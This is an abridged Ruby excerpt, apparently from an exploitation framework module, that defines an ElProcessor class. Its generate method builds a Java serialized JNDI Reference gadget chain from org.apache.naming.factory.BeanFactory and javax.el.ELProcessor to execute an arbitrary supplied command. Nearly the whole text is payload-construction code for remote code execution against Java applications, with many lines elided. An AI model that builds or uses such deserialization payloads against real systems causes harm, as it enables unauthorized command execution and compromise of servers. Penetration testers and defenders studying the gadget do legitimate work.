  ...
  class ElProcessor
    ...
    def self.generate(cmd, shell: nil)
        ...
        builder.new_object(
          ...
          super_class: builder.new_class(
            ...
            super_class: builder.new_class(
              ...
              new_class.fields = [
                new_field(stream: stream, name: 'addrs', field_type: 'Ljava/util/Vector;'),
                new_field(stream: stream, name: 'classFactory', field_type: 'Ljava/lang/String;'),
                new_field(stream: stream, name: 'classFactoryLocation', field_type: new_ref(stream: stream, handle: 8257540)),
                new_field(stream: stream, name: 'className', field_type: new_ref(stream: stream, handle: 8257540))
              ]
            },
          ),
          data: [
            builder.new_object(
                  ...
                  values: [
                    ...
                    builder.new_object(
                      ...
                      super_class: builder.new_class(
                        ...
                        new_class.fields = [
                          new_field(stream: stream, name: 'addrType', field_type: new_ref(stream: stream, handle: 8257540))
                        ]
                      },
                      data: [
                      ...
                      new_object.class_desc.description.fields = [
                        new_field(stream: stream, name: 'contents', field_type: new_ref(stream: stream, handle: 8257540))
                      ]
                    },
                    # stream.contents.first.class_data[0].class_data[2].values[1]
                    builder.new_object(
                      description: new_ref(stream: stream, handle: 8257547),
                      data: [
                        Rex::Java::Serialization::Model::Utf.new(stream, 'auth'),
                        new_ref(stream: stream, handle: 8257551)
                      ]
                    ),
                    builder.new_object(
                      description: new_ref(stream: stream, handle: 8257547),
              ...
              new_object.class_desc.description.fields = [
                new_field(stream: stream, type: 'int', name: 'capacityIncrement'),
                new_field(stream: stream, type: 'int', name: 'elementCount'),
                new_field(stream: stream, type: 'array', name: 'elementData', field_type: '[Ljava/lang/Object;')
              ]
            },
      ...
      stream.references = [
        ...
        Rex::Java::Serialization::Model::Utf.new(stream, 'Ljava/lang/String;'),
        stream.contents[0],
        builder.new_class(
          name: 'java.util.Vector',
          serial: 15679138459660562177,
        ...
        Rex::Java::Serialization::Model::Utf.new(stream, 'Ljava/lang/Object;'),
        stream.contents[0].class_data[0],
        builder.new_class(
          name: '[Ljava.lang.Object;',
          serial: 10434374826863044972,
          flags: 2
        ),
        stream.contents[0].class_data[0].class_data[2],
        builder.new_class(
          name: 'javax.naming.StringRefAddr',
          serial: 10434374826863044972,
          flags: 2,
        ...
        Rex::Java::Serialization::Model::Utf.new(stream, ''),
        stream.contents.first.class_data[0].class_data[2].values[1],
        stream.contents.first.class_data[0].class_data[2].values[1].class_data[0],
        stream.contents.first.class_data[0].class_data[2].values[2],
        stream.contents.first.class_data[0].class_data[2].values[2].class_data[0],
        stream.contents.first.class_data[0].class_data[2].values[2].class_data[1],
        stream.contents.first.class_data[0].class_data[2].values[3],
        stream.contents.first.class_data[0].class_data[2].values[3].class_data[0],
        stream.contents.first.class_data[0].class_data[2].values[3].class_data[1],
        stream.contents.first.class_data[0].class_data[2].values[4],
        stream.contents.first.class_data[0].class_data[2].values[4].class_data[0],
        stream.contents.first.class_data[0].class_data[2].values[4].class_data[1],
        Rex::Java::Serialization::Model::Utf.new(stream, 'org.apache.naming.factory.BeanFactory'),
        Rex::Java::Serialization::Model::Utf.new(stream, 'javax.el.ELProcessor')
      ]
